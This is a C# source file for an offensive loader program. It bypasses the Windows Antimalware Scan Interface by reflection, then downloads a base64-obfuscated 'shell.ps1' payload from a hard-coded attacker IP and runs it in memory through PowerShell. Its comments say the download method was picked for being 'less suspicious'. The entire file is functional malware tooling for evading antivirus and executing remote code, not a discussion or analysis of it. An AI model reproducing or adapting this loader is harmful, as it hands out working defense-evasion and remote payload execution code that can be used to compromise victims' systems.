using System;
using System.Net;
using System.Text;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Reflection;
using System.Runtime.InteropServices;

namespace Loader
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                // <<<<<<<<<<< CHANGE THIS IP BEFORE COMPILING >>>>>>>>>>>
                string attackerIP = "192.168.1.94";

                Console.WriteLine("[*] Patching AMSI using .NET reflection...");
                PatchAMSI();

                Console.WriteLine("[*] Downloading PowerShell payload...");
                string shellPath = Obf("c2hlbGwucHMx"); // "shell.ps1"
                string psUrl = $"http://{attackerIP}/{shellPath}";
                string psScript = GetStringFromUrl(psUrl);
                ExecutePowerShell(psScript);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Error: " + ex.Message);
            }
        }

        // Executes a given PowerShell script string in memory using Runspace
        static void ExecutePowerShell(string script)
        {
            using (PowerShell ps = PowerShell.Create())
            {
                ps.AddScript(script);
                ps.Invoke();
            }
        }

        // Patch AMSI using .NET Reflection (amsiInitFailed)
        static void PatchAMSI()
        {
            string amsiType = "System.Management.Automation.AmsiUtils";
            Type t = Type.GetType(amsiType);
            if (t == null) return;
            FieldInfo field = t.GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static);
            if (field != null)
            {
                field.SetValue(null, true);
                Console.WriteLine("[+] AMSI patched successfully.");
            }
        }

        // Base64 decoder for obfuscating static strings
        static string Obf(string base64)
        {
            byte[] data = Convert.FromBase64String(base64);
            return Encoding.UTF8.GetString(data);
        }

        // Retrieves a string from a URL using HttpWebRequest (less suspicious than WebClient)
        static string GetStringFromUrl(string url)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.Method = "GET";
            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            using (System.IO.StreamReader reader = new System.IO.StreamReader(response.GetResponseStream()))
            {
                return reader.ReadToEnd();
            }
        }
    }
}
